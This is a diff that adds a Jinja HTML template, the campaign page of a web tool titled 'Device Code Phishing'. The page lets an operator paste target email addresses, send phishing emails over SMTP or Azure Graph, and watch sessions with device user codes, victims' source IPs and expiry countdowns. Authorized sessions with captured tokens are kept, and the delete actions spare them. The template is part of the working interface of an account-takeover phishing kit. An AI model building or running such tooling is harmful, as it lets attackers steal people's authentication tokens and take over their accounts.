@@ -1,0 +1,465 @@
+{% extends "base.html" %}
+{% block title %}Campaign: {{ campaign.name }} - Device Code Phishing{% endblock %}
+{% block content %}
+<div class="campaign-header">
+    <div class="campaign-header-title">
+    <h2>#{{ sessions|length }} {{ campaign.name or 'Campaign' }}</h2>
+    </div>
+    <div class="campaign-header-meta">
+        <p><strong>Email delivery:</strong>
+            {% if campaign.email_delivery_method == 'smtp' %}
+                SMTP {% if campaign.smtp_config %}({{ campaign.smtp_config.name }} – {{ campaign.smtp_config.from_email }}){% else %}– <span class="alert alert-danger" style="display:inline; padding:0.2rem 0.5rem;">No SMTP config selected – emails will not be sent.</span>{% endif %}
+            {% elif campaign.email_delivery_method == 'azure' %}
+                Azure (Graph)
+            {% else %}
+                None
+            {% endif %}
+        </p>
+    </div>
+</div>
+<p class="mb-2">
+    <a href="{{ url_for('main.campaign_edit', id=campaign.id) }}" class="btn">Edit</a>
+    <a href="{{ url_for('main.campaign_list') }}" class="btn">Back to campaigns</a>
+</p>
+<div class="card launch-card">
+    <div style="display:flex; justify-content:space-between; align-items:center; gap:1rem;">
+        <h2 style="margin: 0;">Launch campaign</h2>
+        <p style="margin: 0; text-align: right;">
+            <strong>Status:</strong>
+            <span class="badge badge-{{ ui_status }}">{{ ui_status }}</span>
+        </p>
+    </div>
+    <button id="open-email-popup" type="button" class="btn btn-primary">Launch via email list</button>
+    {% if campaign.api_path %}
+    <div class="label-hint" style="margin-left: 0.5rem; margin-top: 0.5rem; padding: 0.25rem 0.5rem; border-radius: 4px; background: rgba(0, 0, 0, 0.05); display: inline-block;">
+        <span style="font-weight: 600; margin-right: 0.25rem;">API endpoint (POST):</span>
+        <code>{{ request.url_root.rstrip('/') }}/d/{{ campaign.api_path }}</code>
+    </div>
+    {% endif %}
+    <div id="launch-result" class="mt-2" style="display:none;"></div>
+</div>
+<div class="card">
+    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:0.5rem;">
+        <h2>Sessions</h2>
+        {% if sessions %}
+        <form id="delete-all-sessions-form" action="{{ url_for('main.sessions_delete_all', campaign_id=campaign.id) }}" method="post">
+            <button type="submit" class="btn btn-sm btn-danger">Delete all sessions (no tokens)</button>
+        </form>
+        {% endif %}
+    </div>
+    <table>
+        <thead>
+            <tr>
+                <th>Target</th>
+                <th>Source IP</th>
+                <th>User code</th>
+                <th>Status</th>
+                <th>Time remaining</th>
+                <th>Email sent</th>
+                <th>Created</th>
+                <th>Actions</th>
+            </tr>
+        </thead>
+        <tbody>
+            {% for s in sessions %}
+            <tr>
+                <td>{{ s.target_email or '-' }}</td>
+                <td>{{ s.source_ip or '-' }}</td>
+                <td><code>{{ s.user_code or '-' }}</code></td>
+                <td>
+                    {% set is_expired = (s.expires_at and (s.expires_at - now).total_seconds() <= 0) %}
+                    {% if s.status == 'pending' and is_expired %}
+                        <span class="badge badge-expired">expired</span>
+                    {% else %}
+                        <span class="badge badge-{{ s.status }} {% if s.status == 'error' %}session-error-badge{% endif %}" {% if s.status == 'error' %}data-error-message="{{ (s.error_message or 'No details')|e }}" title="Click to view error"{% endif %}>{{ s.status }}</span>
+                    {% endif %}
+                </td>
+                <td>
+                    {% if s.expires_at and s.status == 'pending' %}
+                        {% set remaining = (s.expires_at - now).total_seconds() %}
+                        {% if remaining > 0 %}
+                            <span class="time-remaining" data-remaining="{{ remaining|int }}">
+                                {{ (remaining // 60)|int }}m {{ (remaining % 60)|int }}s
+                            </span>
+                        {% else %}
+                            expired
+                        {% endif %}
+                    {% else %}
+                        -
+                    {% endif %}
+                </td>
+                <td>{{ 'Yes' if s.email_sent else 'No' }}</td>
+                <td>{{ s.created_at.strftime('%Y-%m-%d %H:%M') if s.created_at else '-' }}</td>
+                <td>
+                    {% if s.status == 'pending' and not is_expired %}
+                    <form action="{{ url_for('main.session_deactivate', campaign_id=campaign.id, session_id=s.id) }}" method="post" style="display:inline;" class="session-deactivate-form">
+                        <button type="submit" class="btn btn-sm">Deactivate</button>
+                    </form>
+                    {% endif %}
+                    <form action="{{ url_for('main.session_delete', campaign_id=campaign.id, session_id=s.id) }}" method="post" style="display:inline;" data-row-delete="1">
+                        <button type="submit" class="btn btn-sm btn-danger">Delete</button>
+                    </form>
+                </td>
+            </tr>
+            {% else %}
+            <tr><td colspan="7">No sessions yet. Launch the campaign with target emails above.</td></tr>
+            {% endfor %}
+        </tbody>
+    </table>
+</div>
+
+<div id="error-popup-overlay" class="popup-overlay" style="display: none;" aria-hidden="true"></div>
+<div id="error-popup" class="popup-box" style="display: none;" role="dialog" aria-labelledby="error-popup-title">
+    <h3 id="error-popup-title">Session error</h3>
+    <pre id="error-popup-message" class="popup-message"></pre>
+    <button type="button" class="btn btn-primary" id="error-popup-close">Close</button>
+</div>
+
+<div id="email-popup-overlay" class="popup-overlay" style="display: none;" aria-hidden="true"></div>
+<div id="email-popup" class="popup-box" style="display: none;" role="dialog" aria-labelledby="email-popup-title">
+    <h3 id="email-popup-title">Launch via email list</h3>
+    <p class="label-hint">Paste one target per line (email, UPN, or identifier).</p>
+    <form id="email-launch-form">
+        <textarea id="email_target_emails" name="target_emails" rows="10" placeholder="user1@company.com&#10;user2@company.com"></textarea>
+        <div style="display:flex; justify-content:flex-end; gap:0.5rem; margin-top:0.5rem;">
+            <button type="button" class="btn" id="email-popup-close">Cancel</button>
+            <button type="submit" class="btn btn-primary">Launch</button>
+        </div>
+    </form>
+</div>
+<!-- Generic confirm popup -->
+<div id="confirm-popup-overlay" class="popup-overlay" style="display:none;" aria-hidden="true"></div>
+<div id="confirm-popup" class="popup-box" style="display:none;" role="dialog" aria-labelledby="confirm-popup-title">
+    <h3 id="confirm-popup-title">Please confirm</h3>
+    <p id="confirm-popup-message" class="mb-2" style="font-size:0.9rem;"></p>
+    <div style="display:flex; justify-content:flex-end; gap:0.5rem; margin-top:0.5rem;">
+        <button type="button" class="btn" id="confirm-popup-cancel">Cancel</button>
+        <button type="button" class="btn btn-danger" id="confirm-popup-ok">Delete</button>
+    </div>
+</div>
+{% endblock %}
+{% block scripts %}
+<script>
+(function () {
+    var overlay = document.getElementById('error-popup-overlay');
+    var popup = document.getElementById('error-popup');
+    var messageEl = document.getElementById('error-popup-message');
+    var closeBtn = document.getElementById('error-popup-close');
+    function showErrorPopup(msg) {
+        messageEl.textContent = msg || 'No details';
+        overlay.style.display = 'block';
+        popup.style.display = 'block';
+        overlay.setAttribute('aria-hidden', 'false');
+    }
+    function hideErrorPopup() {
+        overlay.style.display = 'none';
+        popup.style.display = 'none';
+        overlay.setAttribute('aria-hidden', 'true');
+    }
+    closeBtn.addEventListener('click', hideErrorPopup);
+    overlay.addEventListener('click', hideErrorPopup);
+    document.querySelectorAll('.session-error-badge').forEach(function (el) {
+        el.style.cursor = 'pointer';
+        el.addEventListener('click', function () {
+            showErrorPopup(this.getAttribute('data-error-message'));
+        });
+    });
+})();
+
+(function () {
+    var overlay = document.getElementById('email-popup-overlay');
+    var popup = document.getElementById('email-popup');
+    var openBtn = document.getElementById('open-email-popup');
+    var closeBtn = document.getElementById('email-popup-close');
+    var form = document.getElementById('email-launch-form');
+    var textarea = document.getElementById('email_target_emails');
+    var resultEl = document.getElementById('launch-result');
+
+    function openPopup() {
+        overlay.style.display = 'block';
+        popup.style.display = 'block';
+        textarea && textarea.focus();
+    }
+
+    function closePopup() {
+        overlay.style.display = 'none';
+        popup.style.display = 'none';
+    }
+
+    if (openBtn) {
+        openBtn.addEventListener('click', function (e) {
+            e.preventDefault();
+            openPopup();
+        });
+    }
+    if (closeBtn) {
+        closeBtn.addEventListener('click', function (e) {
+            e.preventDefault();
+            closePopup();
+        });
+    }
+    if (overlay) {
+        overlay.addEventListener('click', function (e) {
+            if (e.target === overlay) {
+                closePopup();
+            }
+        });
+    }
+    if (form) {
+        form.addEventListener('submit', function (e) {
+            e.preventDefault();
+            var raw = textarea ? textarea.value : '';
+            var emails = raw.split(/[\r\n]+/).map(function (s) { return s.trim(); }).filter(Boolean);
+            if (!emails.length) {
+                if (resultEl) {
+                    resultEl.style.display = 'block';
+                    resultEl.className = 'mt-2 alert alert-danger';
+                    resultEl.textContent = 'Enter at least one target.';
+                }
+                return;
+            }
+            if (resultEl) {
+                resultEl.style.display = 'block';
+                resultEl.className = 'mt-2 alert alert-info';
+                resultEl.textContent = 'Launching...';
+            }
+            fetch('{{ url_for("main.campaign_launch", id=campaign.id) }}', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ target_emails: emails })
+            })
+            .then(function (r) { return r.json().then(function (d) { return { ok: r.ok, data: d }; }); })
+            .then(function (x) {
+                if (!resultEl) return;
+                if (x.ok) {
+                    resultEl.className = 'mt-2 alert ' + (x.data.partial_error ? 'alert-info' : 'alert-success');
+                    resultEl.textContent = (x.data.message || 'Launched.') + (x.data.partial_error ? ' ' + x.data.partial_error : '');
+                    setTimeout(function () { window.location.reload(); }, x.data.partial_error ? 5000 : 2000);
+                } else {
+                    resultEl.className = 'mt-2 alert alert-danger';
+                    resultEl.textContent = x.data.error || 'Error';
+                }
+            })
+            .catch(function () {
+                if (!resultEl) return;
+                resultEl.className = 'mt-2 alert alert-danger';
+                resultEl.textContent = 'Request failed';
+            });
+            closePopup();
+        });
+    }
+})();
+
+// Live countdown for "Time remaining" column
+(function () {
+    var timers = document.querySelectorAll('.time-remaining');
+    if (!timers.length) return;
+
+    function formatSeconds(sec) {
+        if (sec <= 0) return 'expired';
+        var m = Math.floor(sec / 60);
+        var s = sec % 60;
+        return m + 'm ' + s + 's';
+    }
+
+    function tick() {
+        var anyActive = false;
+        timers.forEach(function (el) {
+            var v = parseInt(el.getAttribute('data-remaining'), 10);
+            if (isNaN(v)) return;
+            v -= 1;
+            if (v <= 0) {
+                el.textContent = 'expired';
+                el.removeAttribute('data-remaining');
+                // Also flip status badge + actions within this row
+                var row = el.closest('tr');
+                if (row) {
+                    var statusSpan = row.querySelector('td:nth-child(4) span.badge');
+                    if (statusSpan && statusSpan.textContent.trim() === 'pending') {
+                        statusSpan.textContent = 'expired';
+                        statusSpan.classList.remove('badge-pending');
+                        statusSpan.classList.add('badge-expired');
+                    }
+                    var actionsCell = row.querySelector('td:last-child');
+                    if (actionsCell) {
+                        var deactivateForm = actionsCell.querySelector('form[action*="session_deactivate"]');
+                        if (deactivateForm) {
+                            deactivateForm.remove();
+                        }
+                    }
+                }
+            } else {
+                el.setAttribute('data-remaining', String(v));
+                el.textContent = formatSeconds(v);
+                anyActive = true;
+            }
+        });
+        if (!anyActive) {
+            clearInterval(intervalId);
+        }
+    }
+
+    var intervalId = window.setInterval(tick, 1000);
+})();
+
+// Styled confirm popup for destructive actions (delete-all + per-row delete)
+(function () {
+    var overlay = document.getElementById('confirm-popup-overlay');
+    var popup = document.getElementById('confirm-popup');
+    var msgEl = document.getElementById('confirm-popup-message');
+    var okBtn = document.getElementById('confirm-popup-ok');
+    var cancelBtn = document.getElementById('confirm-popup-cancel');
+    var pendingHandler = null;
+
+    if (!overlay || !popup || !okBtn || !cancelBtn || !msgEl) return;
+
+    function openConfirm(message, onConfirm) {
+        pendingHandler = (typeof onConfirm === 'function') ? onConfirm : null;
+        msgEl.textContent = message || 'Are you sure?';
+        overlay.style.display = 'block';
+        popup.style.display = 'block';
+        overlay.setAttribute('aria-hidden', 'false');
+    }
+
+    function closeConfirm() {
+        overlay.style.display = 'none';
+        popup.style.display = 'none';
+        overlay.setAttribute('aria-hidden', 'true');
+        pendingHandler = null;
+    }
+
+    okBtn.addEventListener('click', function () {
+        if (pendingHandler) {
+            pendingHandler();
+        }
+        closeConfirm();
+    });
+
+    cancelBtn.addEventListener('click', function () {
+        closeConfirm();
+    });
+
+    overlay.addEventListener('click', function (e) {
+        if (e.target === overlay) {
+            closeConfirm();
+        }
+    });
+
+    // Expose helper globally so other scripts on this page can reuse it.
+    window._dc_openConfirm = openConfirm;
+
+    // Hook delete-all form
+    var deleteAllForm = document.getElementById('delete-all-sessions-form');
+    if (deleteAllForm) {
+        deleteAllForm.addEventListener('submit', function (e) {
+            e.preventDefault();
+            var msg = 'Delete all sessions WITHOUT captured tokens? Authorized sessions with captured tokens will be kept.';
+            if (window._dc_openConfirm) {
+                window._dc_openConfirm(msg, function () { deleteAllForm.submit(); });
+            } else if (window.confirm(msg)) {
+                deleteAllForm.submit();
+            }
+        });
+    }
+})();
+
+// Delete session rows via AJAX + styled confirm popup
+(function () {
+    var table = document.querySelector('.card table');
+    if (!table) return;
+
+    table.addEventListener('submit', function (e) {
+        var form = e.target;
+        if (!(form instanceof HTMLFormElement)) return;
+        // Only intercept per-row delete forms, not bulk delete-all.
+        if (!form.hasAttribute('data-row-delete')) return;
+        if (!form.action || form.action.indexOf('/sessions/') === -1 || form.action.indexOf('/delete') === -1) return;
+
+        e.preventDefault();
+
+        var row = form.closest('tr');
+        if (!row) return;
+
+        function performDelete() {
+            fetch(form.action, {
+                method: 'POST',
+                body: new FormData(form),
+            })
+            .then(function (r) {
+                if (!r.ok) throw new Error('Delete failed');
+                row.parentNode && row.parentNode.removeChild(row);
+            })
+            .catch(function () {
+                window.location.reload();
+            });
+        }
+
+        var msg = 'Delete this session? Any captured token will be removed.';
+        if (window._dc_openConfirm) {
+            window._dc_openConfirm(msg, performDelete);
+        }
+    });
+})();
+
+// Styled confirm popup for deactivating sessions (no browser confirm)
+(function () {
+    var forms = document.querySelectorAll('.session-deactivate-form');
+    if (!forms.length) return;
+
+    forms.forEach(function (form) {
+        form.addEventListener('submit', function (e) {
+            e.preventDefault();
+            var msg = 'Deactivate this session? Polling will stop.';
+            function doDeactivate() { form.submit(); }
+            if (window._dc_openConfirm) {
+                window._dc_openConfirm(msg, doDeactivate);
+            }
+        });
+    });
+})();
+
+// Live campaign/session refresh via Socket.IO
+(function () {
+    var thisCampaignId = {{ campaign.id }};
+
+    // Helper: hard reload when server-side version changes.
+    var initialVersion = {
+        status: "{{ ui_status }}",
+        total: {{ sessions|length }},
+        pending: {{ sessions|selectattr('status', 'equalto', 'pending')|list|length }},
+        authorized: {{ sessions|selectattr('status', 'equalto', 'authorized')|list|length }},
+        error: {{ sessions|selectattr('status', 'in', ['error', 'expired', 'denied', 'cancelled'])|list|length }},
+    };
+
+    function checkForChanges() {
+        fetch("{{ url_for('main.api_campaign_version', id=campaign.id) }}", { cache: "no-store" })
+            .then(function (r) { return r.json(); })
+            .then(function (d) {
+                if (!d || !d.ok) return;
+                if (
+                    d.status !== initialVersion.status ||
+                    d.total_sessions !== initialVersion.total ||
+                    d.pending_sessions !== initialVersion.pending ||
+                    d.authorized_sessions !== initialVersion.authorized ||
+                    d.error_sessions !== initialVersion.error
+                ) {
+                    window.location.reload();
+                }
+            })
+            .catch(function () { /* ignore */ });
+    }
+
+    // Poll every 5 seconds as a reliable fallback.
+    window.setInterval(checkForChanges, 5000);
+
+    // If websockets are connected, also react immediately.
+    if (window._dc_socket) {
+        var socket = window._dc_socket;
+        socket.on('campaign_updated', function (payload) {
+            if (!payload || payload.campaign_id !== thisCampaignId) return;
+            window.location.reload();
+        });
+    }
+})();
+</script>
+{% endblock %}
